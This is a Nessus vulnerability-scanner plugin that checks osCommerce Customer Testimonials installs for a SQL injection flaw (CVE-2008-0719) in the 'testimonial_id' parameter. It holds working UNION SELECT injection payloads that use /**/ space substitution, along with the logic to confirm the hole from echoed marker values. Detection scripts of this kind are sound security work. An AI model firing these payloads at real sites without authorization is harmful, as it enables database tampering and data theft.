#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31051);
  script_version("$Revision: 1.19 $");
 script_cvs_date("$Date: 2016/05/20 14:21:44 $");

  script_cve_id("CVE-2008-0719");
  script_bugtraq_id(27664);
  script_osvdb_id(41116);
  script_xref(name:"EDB-ID", value:"5075");
  script_xref(name:"Secunia", value:"28831");

  script_name(english:"osCommerce Customer Testimonials customer_testimonials.php testimonial_id Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a testimonial");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
  script_set_attribute(attribute:"description", value:
"The remote host is running Customer Testimonials, a third-party addon
for the open source e-commerce system osCommerce.

The version of Customer Testimonials installed on the remote host
fails to sanitize user input to the 'testimonial_id' parameter of the
'customer_testimonials.php' script before using it to construct a
database query.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated attacker may be able to exploit this issue to
manipulate database queries, leading to disclosure of sensitive
information, modification of data, or attacks against the underlying
database." );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);

 script_set_attribute(attribute:"plugin_publication_date", value:"2008/02/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oscommerce:customer_testimonials");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("oscommerce_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/oscommerce");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP scripts.");


# Test an install.
install = get_install_from_kb(appname:'oscommerce', port:port);
if (isnull(install)) exit(0, "osCommerce wasn't detected on port "+port+".");
dir = install['dir'];


magic1 = unixtime();
magic2 = rand();
magic3 = rand();
magic4 = rand();

exploits = make_list(
  string("99999 UNION SELECT ", magic1, ",2,concat(", magic2, ",0x3a,", magic3, ",0x3a,", magic4, "),4,5,6,7--"),
  string("99999 UNION SELECT ", magic1, ",2,concat(", magic2, ",0x3a,", magic3, ",0x3a,", magic4, "),4,5,6,7,8--"),
  string("99999 UNION SELECT ", magic1, ",2,concat(", magic2, ",0x3a,", magic3, ",0x3a,", magic4, "),4,5,6,7,8,9--")
);


# Try to exploit the issue to manipulate a category listing.
foreach exploit (exploits)
{
  url = string(
    dir, "/customer_testimonials.php?",
    "testimonial_id=", str_replace(find:" ", replace:"/**/", string:exploit)
  );

  res = http_send_recv3(port:port, method:"GET", item:url);
  if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

  # There's a problem if we could manipulate the testimonial.
  if (
    "<!-- customer testimonials //-->" >< res[2] &&
    string("Subject: ", magic1, "<br><br>", magic2, ":", magic3, ":", magic4, "<p>") >< res[2]
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}

exit(0, "No oscommerce installation is vulnerable on port "+port);
